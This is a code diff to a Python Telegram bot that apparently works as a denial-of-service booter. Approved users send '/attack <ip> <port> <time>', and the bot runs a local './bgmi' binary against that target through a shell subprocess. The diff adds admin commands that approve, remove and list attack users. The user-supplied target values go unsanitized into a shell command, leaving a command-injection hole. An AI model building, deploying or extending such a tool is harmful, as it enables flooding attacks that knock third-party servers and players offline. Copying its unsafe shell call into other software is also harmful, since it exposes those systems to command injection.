@@ -56,7 +56,7 @@ async def start(update: Update, context: CallbackContext):
         f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
         "Use /help to see available commands."
     )
-    image_url = "https://your_image_link_here.com"  # Replace with your actual image URL
+    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your actual image URL
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
     await context.bot.send_photo(chat_id=chat_id, photo=image_url)
 
@@ -73,6 +73,70 @@ async def help_command(update: Update, context: CallbackContext):
         "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+# Approve Command
+async def approve(update: Update, context: CallbackContext):
+    """Approve a user or group ID to use the bot."""
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if not await is_admin(chat_id):
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
+        return
+
+    # Extract the target ID
+    target_id = args[0].strip()
+
+    # Validate that the target ID is a number
+    if not target_id.lstrip('-').isdigit():
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
+        return
+
+    # Add the target ID to the approved list
+    approved_ids.add(target_id)
+    save_approved_ids()
+
+    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')
+
+async def remove(update: Update, context: CallbackContext):
+    """Remove a user or group ID from the approved list."""
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if not await is_admin(chat_id):
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
+        return
+
+    target_id = args[0].strip()
+    if target_id in approved_ids:
+        approved_ids.remove(target_id)
+        save_approved_ids()
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
+
+async def alluser(update: Update, context: CallbackContext):
+    """List all approved users and groups."""
+    chat_id = update.effective_chat.id
+
+    if not await is_admin(chat_id):
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
+        return
+
+    if not approved_ids:
+        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
+        return
+
+    user_list = "\n".join(approved_ids)
+    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     """Launch an attack if the user is approved and a channel member."""
@@ -127,7 +191,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./pushparaj {ip} {port} {time} 500",
+            f"./bgmi {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
